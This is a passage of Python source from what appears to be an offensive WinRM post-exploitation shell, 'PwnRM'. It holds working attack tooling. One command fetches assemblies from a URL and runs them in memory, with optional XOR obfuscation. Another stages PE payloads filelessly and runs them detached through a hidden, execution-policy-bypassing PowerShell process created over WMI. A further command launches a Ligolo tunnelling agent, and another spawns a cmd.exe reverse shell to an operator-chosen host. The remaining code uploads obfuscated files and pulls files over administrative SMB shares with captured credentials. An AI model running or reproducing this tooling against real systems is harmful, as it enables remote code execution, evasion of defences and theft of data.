        interrupted = self.run_with_interrupt(script, self.write_line)
        return {"status": "interrupted" if interrupted else "completed"}

    # ── !netrun ───────────────────────────────────────────────────────────────
    def netrun(self, cmdline: str):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !netrun [--xor] URL_OR_REMOTE_PATH [ARG..]")
            return {"status": "error"}
        if args[0].lower() in {"--xor", "-xor"}:
            if len(args) == 1:
                self.write_warning("usage: !netrun [--xor] URL_OR_REMOTE_PATH [ARG..]")
                return {"status": "error"}
            use_xor = True
            args    = args[1:]
        else:
            use_xor = False
        source, raw_argv = args[0], args[1:]
        if source.lower().startswith(("http://", "https://")):
            fetch = f"(New-Object Net.WebClient).DownloadData({str_b64(source)})"
        else:
            fetch = f"[IO.File]::ReadAllBytes('{self._pse(source)}')"
        argv = "[string[]]@(" + ",".join(str_b64(arg) for arg in raw_argv) + ")"
        assembly_bytes = f"{call_XorEnc}($buf)" if use_xor else "$buf"
        xor_import = import_XorEnc if use_xor else ""
        script = f"""
{import_HostWriter}
{xor_import}
$buf = {fetch}
$out = {new_HostWriter}
$oldOut = [Console]::Out
$oldErr = [Console]::Error
try {{
    $dll = [Reflection.Assembly]::Load({assembly_bytes})
    [Console]::SetOut($out)
    [Console]::SetError($out)
    $argv = {argv}
    if ($dll.EntryPoint.GetParameters().Length -eq 0) {{
        [void]$dll.EntryPoint.Invoke($null, $null)
    }} else {{
        [void]$dll.EntryPoint.Invoke($null, [object[]](,$argv))
    }}
}} finally {{
    [Console]::SetOut($oldOut)
    [Console]::SetError($oldErr)
    if ($out) {{ $out.Dispose() }}
    if ($buf) {{ [Array]::Clear($buf, 0, $buf.Length) }}
    Remove-Variable @('buf','dll','out','oldOut','oldErr','argv') -ErrorAction SilentlyContinue
}}
"""
        interrupted = self.run_with_interrupt(script, self.write_line)
        return {"status": "interrupted" if interrupted else "completed"}

    def _max_memory_execution_size(self) -> int:
        try:
            value = int(os.environ.get("PWNRM_MAX_EXEC", 64 * 1024 * 1024))
            if not 1 <= value <= 512 * 1024 * 1024:
                raise ValueError
            return value
        except ValueError:
            self.write_warning("PWNRM_MAX_EXEC is invalid; using the 64 MiB default.")
            return 64 * 1024 * 1024

    def _stage_runspace_bytes(self, data: bytes, label: str) -> str:
        """Chunk local bytes into a runspace-persistent MemoryStream."""
        variable = f"PwnRM_{label}_{secrets.token_hex(8)}"
        error_count = len(getattr(self, "last_run_errors", []))
        self.run_sync(f"$global:{variable} = New-Object IO.MemoryStream")
        for chunk in chunks(data, self._transfer_chunk_size()):
            encoded = b64str(chunk)
            self.run_sync(
                f"$c=[Convert]::FromBase64String('{encoded}');"
                f"try{{$global:{variable}.Write($c,0,$c.Length)}}"
                "finally{if($c){[Array]::Clear($c,0,$c.Length)};Remove-Variable c -ErrorAction SilentlyContinue}"
            )
            if len(getattr(self, "last_run_errors", [])) > error_count:
                self.run_sync(
                    f"if($global:{variable}){{$global:{variable}.Dispose()}};"
                    f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
                )
                raise NoConsolationError(f"failed to stage {label} bytes in the remote runspace")
        return variable

    @staticmethod
    def _background_job_preamble() -> str:
        return r'''
if (-not $global:PwnRMNoConJobs) { $global:PwnRMNoConJobs = @{} }
foreach ($oldId in @($global:PwnRMNoConJobs.Keys)) {
    $oldJob = $global:PwnRMNoConJobs[$oldId]
    if ($oldJob.Async.IsCompleted) {
        try { [void]$oldJob.PowerShell.EndInvoke($oldJob.Async) } catch {}
        $oldJob.PowerShell.Dispose()
        $global:PwnRMNoConJobs.Remove($oldId)
    }
}
'''

    def _run_detached_memory(
        self,
        *,
        blobs: list[bytes],
        kind: str,
        architecture: str,
        setup: str,
        execute: str,
    ):
        """Hand in-memory blobs to a WMI-created PowerShell process over a pipe."""
        if kind not in {"managed", "native"} or architecture not in {"x86", "x64"}:
            raise NoConsolationError("invalid detached execution configuration")

        pipe_name = f"PwnRM-{secrets.token_hex(16)}"
        variables = []
        try:
            for index, blob in enumerate(blobs):
                variables.append(self._stage_runspace_bytes(blob, f"Detached{index}"))
        except Exception:
            for variable in variables:
                self.run_sync(
                    f"if($global:{variable}){{$global:{variable}.Dispose()}};"
                    f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
                )
            raise
        blob_names = [f"$Blob{index}" for index in range(len(blobs))]
        reads = "\n".join(f"    {name} = Read-PwnRMBlob" for name in blob_names)
        initializers = "\n".join(f"{name} = $null" for name in blob_names)
        clears = "\n".join(
            f"    if ({name}) {{ [Array]::Clear({name}, 0, {name}.Length) }}"
            for name in blob_names
        )
        child = f'''$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
{initializers}
$Pipe = $null
$Reader = $null
try {{
    $Pipe = New-Object -TypeName IO.Pipes.NamedPipeClientStream -ArgumentList @(
        '.', '{pipe_name}', [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None
    )
    $Pipe.Connect(15000)
    $Reader = New-Object IO.BinaryReader($Pipe)
    function Read-PwnRMBlob {{
        $Length = $Reader.ReadInt32()
        if ($Length -lt 0 -or $Length -gt 536870912) {{ throw 'Invalid PwnRM pipe frame length' }}
        [byte[]]$Bytes = $Reader.ReadBytes($Length)
        if ($Bytes.Length -ne $Length) {{ throw 'Truncated PwnRM pipe frame' }}
        return ,$Bytes
    }}
{reads}
{setup}
    $Pipe.WriteByte(165)
    $Pipe.Flush()
    $Reader.Dispose()
    $Reader = $null
    $Pipe = $null
{execute}
}} finally {{
    if ($Reader) {{ $Reader.Dispose() }} elseif ($Pipe) {{ $Pipe.Dispose() }}
{clears}
}}
'''
        encoded_child = b64encode(child.encode("utf-16le")).decode("ascii")
        prepare = "\n".join(
            f"$Blob{index} = $global:{variable}.ToArray(); "
            f"$global:{variable}.Dispose(); "
            f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
            for index, variable in enumerate(variables)
        )
        writes = "\n".join(
            f"    $Writer.Write([int]$Blob{index}.Length); $Writer.Write([byte[]]$Blob{index})"
            for index in range(len(blobs))
        )
        clear_parent = "\n".join(
            f"    if ($Blob{index}) {{ [Array]::Clear($Blob{index}, 0, $Blob{index}.Length) }}"
            for index in range(len(blobs))
        )
        ps_directory = "SysWOW64" if architecture == "x86" else "System32"
        script = f'''$ErrorActionPreference = 'Stop'
{prepare}
$Pipe = $null
$Writer = $null
$DetachedPid = 0
$Acknowledged = $false
try {{
    $Pipe = New-Object -TypeName IO.Pipes.NamedPipeServerStream -ArgumentList @(
        '{pipe_name}', [IO.Pipes.PipeDirection]::InOut, 1,
        [IO.Pipes.PipeTransmissionMode]::Byte, [IO.Pipes.PipeOptions]::Asynchronous
    )
    $PowerShellPath = Join-Path $env:WINDIR '{ps_directory}\\WindowsPowerShell\\v1.0\\powershell.exe'
    $CommandLine = '"' + $PowerShellPath + '" -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_child}'
    $Created = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{ CommandLine = $CommandLine }}
    if ($Created.ReturnValue -ne 0 -or -not $Created.ProcessId) {{
        throw "Win32_Process.Create failed (return=$($Created.ReturnValue))"
    }}
    $DetachedPid = [int]$Created.ProcessId
    $PendingConnection = $Pipe.BeginWaitForConnection($null, $null)
    if (-not $PendingConnection.AsyncWaitHandle.WaitOne(15000)) {{
        throw 'Detached process did not connect to its memory pipe within 15 seconds'
    }}
    $Pipe.EndWaitForConnection($PendingConnection)
    $Writer = New-Object IO.BinaryWriter($Pipe)
{writes}
    $Writer.Flush()
    [byte[]]$Ack = @(0)
    $PendingAck = $Pipe.BeginRead($Ack, 0, 1, $null, $null)
    if (-not $PendingAck.AsyncWaitHandle.WaitOne(15000)) {{
        throw 'Detached process did not acknowledge the payload within 15 seconds'
    }}
    $AckLength = $Pipe.EndRead($PendingAck)
    if ($AckLength -ne 1 -or $Ack[0] -ne 165) {{ throw 'Invalid detached process acknowledgement' }}
    $Acknowledged = $true
    Write-Output "PwnRM detached {kind} memory job started: PID $DetachedPid"
}} finally {{
    if ($Writer) {{ $Writer.Dispose() }} elseif ($Pipe) {{ $Pipe.Dispose() }}
    if (-not $Acknowledged -and $DetachedPid -gt 0) {{
        Stop-Process -Id $DetachedPid -Force -ErrorAction SilentlyContinue
    }}
{clear_parent}
}}
'''
        interrupted = self.run_with_interrupt(script, self.write_line)
        return {
            "status": "interrupted" if interrupted else "completed",
            "capture_output": False,
            "background": not interrupted,
            "detached": not interrupted,
        }

    def _run_managed_memory(
        self,
        payload: bytes,
        argv: list[str],
        capture_output: bool,
        detached: bool = False,
        architecture: str = "x64",
    ):
        if detached:
            encoded_argv = "\0".join(argv).encode("utf-8")
            return self._run_detached_memory(
                blobs=[payload, encoded_argv],
                kind="managed",
                architecture=architecture,
                setup=r'''    $Assembly = [Reflection.Assembly]::Load($Blob0)
    if ($Blob1.Length -eq 0) { [string[]]$Arguments = @() }
    else { [string[]]$Arguments = [Text.Encoding]::UTF8.GetString($Blob1).Split([char]0) }
''',
                execute=r'''    if ($Assembly.EntryPoint.GetParameters().Length -eq 0) {
        [void]$Assembly.EntryPoint.Invoke($null, $null)
    } else {
        [void]$Assembly.EntryPoint.Invoke($null, [object[]](,$Arguments))
    }
''',
            )

        variable = self._stage_runspace_bytes(payload, "ManagedPE")
        argv_ps = "[string[]]@(" + ",".join(str_b64(arg) for arg in argv) + ")"
        if capture_output:
            script = f'''
{import_HostWriter}
$buf = $global:{variable}.ToArray()
$global:{variable}.Dispose()
Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue
$out = {new_HostWriter}
$oldOut = [Console]::Out
$oldErr = [Console]::Error
try {{
    $dll = [Reflection.Assembly]::Load($buf)
    [Console]::SetOut($out)
    [Console]::SetError($out)
    $argv = {argv_ps}
    if ($dll.EntryPoint.GetParameters().Length -eq 0) {{
        [void]$dll.EntryPoint.Invoke($null, $null)
    }} else {{
        [void]$dll.EntryPoint.Invoke($null, [object[]](,$argv))
    }}
}} finally {{
    [Console]::SetOut($oldOut)
    [Console]::SetError($oldErr)
    if ($out) {{ $out.Dispose() }}
    if ($buf) {{ [Array]::Clear($buf, 0, $buf.Length) }}
    Remove-Variable @('buf','dll','out','oldOut','oldErr','argv') -ErrorAction SilentlyContinue
}}
'''
            interrupted = self.run_with_interrupt(script, self.write_line)
            return {"status": "interrupted" if interrupted else "completed", "capture_output": True}

        script = f'''
$buf = $global:{variable}.ToArray()
$global:{variable}.Dispose()
Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue
{self._background_job_preamble()}
$runner = {{
    param([byte[]]$Payload, [string[]]$Arguments)
    try {{
        $assembly = [Reflection.Assembly]::Load($Payload)
        if ($assembly.EntryPoint.GetParameters().Length -eq 0) {{
            [void]$assembly.EntryPoint.Invoke($null, $null)
        }} else {{
            [void]$assembly.EntryPoint.Invoke($null, [object[]](,$Arguments))
        }}
    }} finally {{
        if ($Payload) {{ [Array]::Clear($Payload, 0, $Payload.Length) }}
    }}
}}
$jobId = [Guid]::NewGuid().ToString('N')
$worker = [PowerShell]::Create()
[void]$worker.AddScript($runner.ToString())
[void]$worker.AddArgument($buf)
[void]$worker.AddArgument(({argv_ps}))
$async = $worker.BeginInvoke()
$global:PwnRMNoConJobs[$jobId] = @{{ PowerShell = $worker; Async = $async; Kind = 'managed' }}
Write-Output "PwnRM background memory job started: $jobId"
'''
        interrupted = self.run_with_interrupt(script, self.write_line)
        return {
            "status": "interrupted" if interrupted else "completed",
            "capture_output": False,
            "background": not interrupted,
        }

    def _run_native_memory(
        self,
        *,
        source: str,
        payload: bytes,
        remote_source: bool,
        argv: list[str],
        options: NoConsolationOptions,
        capture_output: bool,
        architecture: str,
        detached: bool = False,
    ):
        loader, bof = load_noconsolation_assets(architecture)
        packed = pack_noconsolation_arguments(
            source=source,
            payload=payload,
            remote_source=remote_source,
            argv=argv,
            options=options,
        )
        if detached:
            return self._run_detached_memory(
                blobs=[loader, bof, packed],
                kind="native",
                architecture=architecture,
                setup=r'''    $LoaderText = [Text.Encoding]::UTF8.GetString($Blob0)
    . ([ScriptBlock]::Create($LoaderText))
    Remove-Variable LoaderText -ErrorAction SilentlyContinue
''',
                execute=r'''    Invoke-PwnRMBof -BOFBytes $Blob1 -EntryPoint go -PackedArguments $Blob2
''',
            )

        loader_var = self._stage_runspace_bytes(loader, "InvokeBof")
        bof_var = self._stage_runspace_bytes(bof, "NoConBof")
        args_var = self._stage_runspace_bytes(packed, "NoConArgs")
        prepare = f'''
$loaderBytes = $global:{loader_var}.ToArray()
$bofBytes = $global:{bof_var}.ToArray()
$packedBytes = $global:{args_var}.ToArray()
$global:{loader_var}.Dispose(); $global:{bof_var}.Dispose(); $global:{args_var}.Dispose()
Remove-Variable -Scope Global -Name {loader_var},{bof_var},{args_var} -ErrorAction SilentlyContinue
'''
        if capture_output:
            script = prepare + r'''
try {
    if (-not (Get-Command Invoke-PwnRMBof -CommandType Function -ErrorAction SilentlyContinue)) {
        $loaderText = [Text.Encoding]::UTF8.GetString($loaderBytes)
        . ([ScriptBlock]::Create($loaderText))
        Set-Item -Path Function:\global:Invoke-PwnRMBof -Value ${function:Invoke-PwnRMBof}
    }
    Invoke-PwnRMBof -BOFBytes $bofBytes -EntryPoint go -PackedArguments $packedBytes
} finally {
    if ($loaderBytes) { [Array]::Clear($loaderBytes,0,$loaderBytes.Length) }
    if ($bofBytes) { [Array]::Clear($bofBytes,0,$bofBytes.Length) }
    if ($packedBytes) { [Array]::Clear($packedBytes,0,$packedBytes.Length) }
}
'''
            interrupted = self.run_with_interrupt(script, self.write_line)
            return {"status": "interrupted" if interrupted else "completed", "capture_output": True}

        script = prepare + self._background_job_preamble() + r'''
$runner = {
    param([byte[]]$Loader, [byte[]]$Bof, [byte[]]$Arguments)
    try {
        . ([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($Loader)))
        Invoke-PwnRMBof -BOFBytes $Bof -EntryPoint go -PackedArguments $Arguments
    } finally {
        if ($Loader) { [Array]::Clear($Loader,0,$Loader.Length) }
        if ($Bof) { [Array]::Clear($Bof,0,$Bof.Length) }
        if ($Arguments) { [Array]::Clear($Arguments,0,$Arguments.Length) }
    }
}
$jobId = [Guid]::NewGuid().ToString('N')
$worker = [PowerShell]::Create()
[void]$worker.AddScript($runner.ToString())
[void]$worker.AddArgument($loaderBytes)
[void]$worker.AddArgument($bofBytes)
[void]$worker.AddArgument($packedBytes)
$async = $worker.BeginInvoke()
$global:PwnRMNoConJobs[$jobId] = @{ PowerShell = $worker; Async = $async; Kind = 'native' }
Write-Output "PwnRM background No-Consolation job started: $jobId"
'''
        interrupted = self.run_with_interrupt(script, self.write_line)
        return {
            "status": "interrupted" if interrupted else "completed",
            "capture_output": False,
            "background": not interrupted,
        }

    # ── !noconsolation ───────────────────────────────────────────────────────
    def noconsolation(self, cmdline: str):
        args = split_args(cmdline)
        usage = (
            "usage: !noconsolation [native|managed] [--capture-output] "
            "[--remote] [--detached] [--timeout SEC] SOURCE [ARG..]"
        )
        if not args:
            self.write_warning(usage)
            return {"status": "error", "error": "missing payload"}

        capture_output = False
        detached = False
        remote_source = False
        mode = ""
        timeout = None
        method = ""
        unicode_method = False
        link_to_peb = False
        dont_unload = False
        load_all_dependencies = False
        idx = 0
        try:
            while idx < len(args):
                arg = args[idx].lower()
                if arg in {"--capture-output", "--capture"}:
                    capture_output = True
                elif arg == "--detached":
                    detached = True
                elif arg == "--remote":
                    remote_source = True
                elif arg in {"native", "managed", "--native", "--managed"}:
                    chosen = arg.removeprefix("--")
                    if mode and mode != chosen:
                        raise ValueError("choose only one of native or managed")
                    mode = chosen
                elif arg == "--timeout":
                    idx += 1
                    if idx >= len(args):
                        raise ValueError("--timeout requires seconds")
                    timeout = int(args[idx])
                    if not 0 <= timeout <= 86400:
                        raise ValueError("timeout must be between 0 and 86400 seconds")
                elif arg == "--method":
                    idx += 1
                    if idx >= len(args) or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_@?$]{0,127}", args[idx]):
                        raise ValueError("invalid or missing DLL method name")
                    method = args[idx]
                elif arg == "--unicode":
                    unicode_method = True
                elif arg == "--link-to-peb":
                    link_to_peb = True
                elif arg == "--dont-unload":
                    dont_unload = True
                elif arg == "--load-all-dependencies":
                    load_all_dependencies = True
                elif arg.startswith("-"):
                    raise ValueError(f"unknown option: {args[idx]}")
                else:
                    break
                idx += 1
            if idx >= len(args):
                raise ValueError("payload source is missing")
            if detached and capture_output:
                raise ValueError("--detached cannot be combined with --capture-output")
        except (ValueError, TypeError) as exc:
            self.write_warning(f"{usage} ({exc})")
            return {"status": "error", "error": str(exc)}

        source, argv = args[idx], args[idx + 1:]
        if remote_source and not mode:
            self.write_warning("--remote requires an explicit native or managed mode.")
            return {"status": "error", "error": "remote payload mode is ambiguous"}

        effective_timeout = timeout if timeout is not None else (60 if capture_output else 0)
        try:
            payload = b"" if remote_source else load_operator_payload(source, self._max_memory_execution_size())
            pe_info = None if remote_source else inspect_pe(payload)
            remote_arch = "x64" if self.run_sync("[IntPtr]::Size").strip() == "8" else "x86"
            selected_mode = mode or ("managed" if pe_info.managed else "native")
            if selected_mode == "managed":
                if not remote_source and not pe_info.managed:
                    raise NoConsolationError("managed mode was selected but the PE has no CLR header")
                if any((method, unicode_method, link_to_peb, dont_unload, load_all_dependencies)):
                    raise NoConsolationError("native loader options cannot be combined with managed mode")
                if remote_source:
                    # Read bytes only inside the remote runspace, then reuse the
                    # same managed runner without touching operator disk.
                    remote_path = self._pse(source)
                    remote_bytes_b64 = self.run_sync(
                        f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))",
                        max_bytes=(self._max_memory_execution_size() * 2),
                    ).strip()
                    payload = b64decode(remote_bytes_b64, validate=True)
                    if len(payload) > self._max_memory_execution_size():
                        raise NoConsolationError("remote managed payload exceeds PWNRM_MAX_EXEC")
                    if not inspect_pe(payload).managed:
                        raise NoConsolationError("remote managed payload has no CLR header")
                return self._run_managed_memory(
                    payload,
                    argv,
                    capture_output,
                    detached=detached,
                    architecture=remote_arch,
                )

            if pe_info and pe_info.architecture != remote_arch:
                raise NoConsolationError(
                    f"native {pe_info.architecture} payload is incompatible with the {remote_arch} WinRM process"
                )
            options = NoConsolationOptions(
                timeout=effective_timeout,
                method=method,
                unicode_method=unicode_method,
                no_output=not capture_output,
                link_to_peb=link_to_peb,
                dont_unload=dont_unload,
                load_all_dependencies=load_all_dependencies,
            )
            return self._run_native_memory(
                source=source,
                payload=payload,
                remote_source=remote_source,
                argv=argv,
                options=options,
                capture_output=capture_output,
                architecture=remote_arch,
                detached=detached,
            )
        except (NoConsolationError, OSError, ValueError, binascii.Error) as exc:
            self.write_error(f"No-Consolation setup failed: {exc}")
            return {"status": "error", "error": str(exc)}

    # ── !ligolo ──────────────────────────────────────────────────────────────
    def ligolo(self, cmdline: str):
        """Launch an operator-supplied Windows Ligolo-ng agent detached."""
        args = split_args(cmdline)
        usage = "usage: !ligolo [--remote] AGENT [LIGOLO_ARG..]"
        if not args:
            self.write_warning(usage)
            return {"status": "error", "error": "missing Ligolo-ng agent"}
        remote = False
        if args[0].lower() == "--remote":
            remote = True
            args = args[1:]
        if not args or args[0].startswith("-"):
            self.write_warning(usage)
            return {"status": "error", "error": "missing Ligolo-ng agent"}

        forwarded = ["--detached", "native"]
        if remote:
            forwarded.append("--remote")
        forwarded.extend(args)
        return self.noconsolation(subprocess.list2cmdline(forwarded))

    # ── !revshell ─────────────────────────────────────────────────────────────
    def revshell(self, cmdline: str):
        args = split_args(cmdline)
        try:
            if len(args) != 2:
                raise ValueError
            parsed_ip = ip_address(args[0])
            if parsed_ip.version != 4:
                self.write_warning("!revshell currently supports IPv4 listeners only")
                return {"status": "error"}
            ip = parsed_ip.packed
            port = int(args[1])
            if not (1 <= port <= 65535):
                self.write_warning("Port must be between 1 and 65535")
                return {"status": "error"}
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except (ValueError, IndexError):
            self.write_warning("usage: !revshell IPv4 PORT")
            return {"status": "error"}
        cmds = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            "Remove-Variable @('sock','sinfo')"
        ]
        self.write_info(c(Y, f"  [*] Spawning reverse shell -> {args[0]}:{args[1]}"))
        for cmd in cmds:
            logging.debug(cmd)
            if self.run_with_interrupt(cmd, self.write_line):
                return {"status": "interrupted"}
        return {"status": "completed"}

    # ── !upload (FIX-02, OPT-02) ──────────────────────────────────────────────
    def upload(self, cmdline: str):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
        if args[0].lower() in {"--xor", "-xor"}:
            unxor = False; args = args[1:]
            if not args:
                self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
        else:
            unxor = True
        if len(args) not in (1, 2):
            self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            max_upload = int(os.environ.get("PWNRM_MAX_UL", 256 * 1024 * 1024))
            if max_upload <= 0:
                raise ValueError
        except ValueError:
            self.write_warning("PWNRM_MAX_UL is invalid; using the 256 MiB default.")
            max_upload = 256 * 1024 * 1024
        try:
            if not src.is_file():
                raise OSError(f"Not a regular file: {src}")
            if src.stat().st_size > max_upload:
                raise OSError(f"Upload exceeds PWNRM_MAX_UL ({max_upload} bytes)")
            with open(src, "rb") as f:
                buf = f.read(max_upload + 1)
            if len(buf) > max_upload:
                raise OSError(f"Upload exceeds PWNRM_MAX_UL ({max_upload} bytes)")
        except IOError as e:
            self.write_error(str(e)); return {"status": "error", "error": str(e)}

        temp_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
        try:
            temp_validated = self._validate_remote_path(temp_raw)
        except ValueError:
            temp_validated = "C:\\Windows\\Temp\\"
        tmpfn = temp_validated + secrets.token_hex(8) + ".tmp"
        tmpfn_pde = self._pde(tmpfn)
        dst_pde = self._pde(dst)

        total = 0
        self.write_info(f"  [~] Uploading -> {c(C, str(tmpfn))}")
        error_count = len(getattr(self, "last_run_errors", []))
        self.run_sync(import_XorEnc)
        self.run_sync(f'[System.IO.File]::WriteAllBytes("{tmpfn_pde}", [byte[]]@())')
        if len(getattr(self, "last_run_errors", [])) > error_count:
            self.run_sync(f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath "{tmpfn_pde}"')
            return {"status": "error", "error": "remote upload initialization failed"}
        for chunk in chunks(buf, self._transfer_chunk_size()):
            chunk_len = len(chunk)
            pct = int((total + chunk_len) * 100 // len(buf)) if len(buf) > 0 else 100
            self.write_progress(f"Upload {total + chunk_len}/{len(buf)} bytes ({pct}%)")
            chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
            xorfunc   = call_XorEnc if unxor else ""
            # [FIX-02] Use double-quoted strings with _pde escaping and -LiteralPath
            cmd = f'Add-Content -LiteralPath "{tmpfn_pde}" -Encoding Byte ([byte[]]$({xorfunc}({chunk_b64})))'
            if self.run_with_interrupt(cmd):
                self.write_warning("Upload interrupted")
                self.run_sync(f'Remove-Item -Force -LiteralPath "{tmpfn_pde}"')
                return {"status": "interrupted"}
            if len(getattr(self, "last_run_errors", [])) > error_count:
                self.run_sync(f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath "{tmpfn_pde}"')
                return {"status": "error", "error": "remote upload chunk failed"}
            total += chunk_len

        self.write_info(f"  [~] Moving to {c(C, str(dst))}")
        if self.run_with_interrupt(f'Move-Item -Force -LiteralPath "{tmpfn_pde}" -Destination "{dst_pde}"', self.write_line):
            self.run_sync(f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath "{tmpfn_pde}"')
            return {"status": "interrupted"}
        if len(getattr(self, "last_run_errors", [])) > error_count:
            self.run_sync(f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath "{tmpfn_pde}"')
            return {"status": "error", "error": "remote upload move failed"}
        h = self.run_sync(f'(Get-FileHash -LiteralPath "{dst_pde}" -Algorithm SHA256).Hash')
        ok = SHA256.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
        if h.strip() != ok:
            self.write_error("  Upload integrity check FAILED — file may be corrupted!")
            self.run_sync(f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath "{dst_pde}"')
            return {"status": "error", "error": "integrity check failed"}
        else:
            self.write_info(c(G, "  [+] Upload complete — SHA-256 verified."))
            return {"status": "completed"}

    @staticmethod
    def _pse(path: Any) -> str:
        """Escape single quotes for safe PS single-quoted string embedding."""
        return str(path).replace("'", "''")

    @staticmethod
    def _pde(path: Any) -> str:
        """
        Escape a path for embedding inside a PowerShell double-quoted string.
        Escapes: backtick (must be first), dollar sign, double-quote.
        """
        s = str(path)
        s = s.replace('`', '``')
        s = s.replace('$', '`$')
        s = s.replace('"', '`"')
        return s

    # ── safe Windows path validator (FIX-07) ───────────────────────────────────
    _SAFE_WINPATH = re.compile(r'^[A-Za-z]:\\(?:[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\)*[^<>:"/\\|?*\x00-\x1f$`;&{}()]*$')
    _SAFE_UNCPATH = re.compile(r'^\\\\[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\[^<>:"/\\|?*\x00-\x1f$`;&{}()].*$')

    @classmethod
    def _validate_remote_path(cls, path: str) -> str:
        """Return validated path if it looks like a legitimate Windows absolute path."""
        if not path or len(path) > 32767:
            raise ValueError("Remote path is empty or exceeds maximum path length.")
        stripped = path.strip()
        if ".." in stripped:
            raise ValueError(
                f"Remote path contains directory traversal sequences: {stripped!r}"
            )
        if not (cls._SAFE_WINPATH.match(stripped) or cls._SAFE_UNCPATH.match(stripped)):
            raise ValueError(
                f"Remote path failed safety validation: {stripped!r}\n"
                "  The WinRM server returned a path containing unsafe or injection characters."
            )
        return stripped

    def _open_authenticated_smb(self):
        """Open an SMB session using the credentials of the active WinRM transport."""
        from impacket.smbconnection import SMBConnection
        from ..core.credentials import KrbCredential, NTCredential

        transport = getattr(self.runspace, "_transport", None)
        creds = getattr(transport, "creds", None)
        parsed = urlparse(str(getattr(transport, "url", "")))
        host = parsed.hostname or str(self.target_info.get("host", ""))
        if not host:
            raise ValueError("SMB fast path could not resolve the target host")

        smb = SMBConnection(host, host, timeout=max(30, int(getattr(self.runspace, "timeout", 30))))
        try:
            if isinstance(creds, KrbCredential):
                previous_ccache = os.environ.get("KRB5CCNAME")
                if creds.ccache:
                    # pyspnego accepts MIT's FILE: URI form, while Impacket's
                    # CCache loader opens KRB5CCNAME as a literal filesystem
                    # path. Keep each dependency's expected representation.
                    os.environ["KRB5CCNAME"] = creds.ccache.removeprefix("FILE:")
                try:
                    smb.kerberosLogin(
                        creds.username,
                        creds.password,
                        creds.domain,
                        useCache=True,
                    )
                finally:
                    if previous_ccache is None:
                        os.environ.pop("KRB5CCNAME", None)
                    else:
                        os.environ["KRB5CCNAME"] = previous_ccache
            elif isinstance(creds, NTCredential):
                smb.login(
                    creds.username,
                    creds.password,
                    creds.domain,
                    "",
                    creds.nt_hash,
                )
            else:
                raise ValueError("active WinRM credentials cannot authenticate SMB")
        except Exception:
            try:
                smb.logoff()
            except Exception:
                pass
            raise
        return smb

    def _read_remote_file_smb(
        self,
        remote_path: str,
        expected_size: int,
        expected_hash: bytes,
        max_bytes: int,
    ) -> bytearray:
        """Use an authenticated administrative share as the bulk-transfer fast path."""
        windows_path = PureWindowsPath(remote_path)
        if not windows_path.drive or windows_path.drive.startswith("\\\\"):
            raise ValueError("SMB fast path requires an absolute drive-letter path")
        share = f"{windows_path.drive.rstrip(':')}$"
        relative_path = "\\".join(windows_path.parts[1:])
        data = bytearray()
        started = time.monotonic()
        last_update = 0.0

        def collect(chunk):
            nonlocal last_update
            if len(data) + len(chunk) > max_bytes:
                raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
            data.extend(chunk)
            now = time.monotonic()
            if now - last_update >= 0.25 or len(data) == expected_size:
                elapsed = max(now - started, 0.001)
                pct = min(100.0, len(data) * 100.0 / max(expected_size, 1))
                rate = len(data) / 1048576 / elapsed
                self.write_progress(
                    f"SMB transfer {len(data)}/{expected_size} bytes ({pct:.1f}%) — {rate:.2f} MiB/s"
                )
                last_update = now

        smb = self._open_authenticated_smb()
        try:
            smb.getFile(share, relative_path, collect)
        except Exception:
            data[:] = b"\x00" * len(data)
            raise
        finally:
            try:
                smb.logoff()
            except Exception:
                pass

        if len(data) != expected_size:
            received_size = len(data)
            data[:] = b"\x00" * len(data)
            raise OSError(f"SMB transfer length mismatch: {received_size} != {expected_size}")
        if SHA256.new(data).hexdigest().upper().encode("ascii") != expected_hash:
            data[:] = b"\x00" * len(data)
            raise OSError("SMB transfer SHA-256 verification failed")
        return data

    def read_remote_file(self, remote_path: str, max_bytes: int | None = None) -> bytearray:
        """Stream one remote file into memory and verify its SHA-256 trailer."""
        path_raw = self.run_sync(
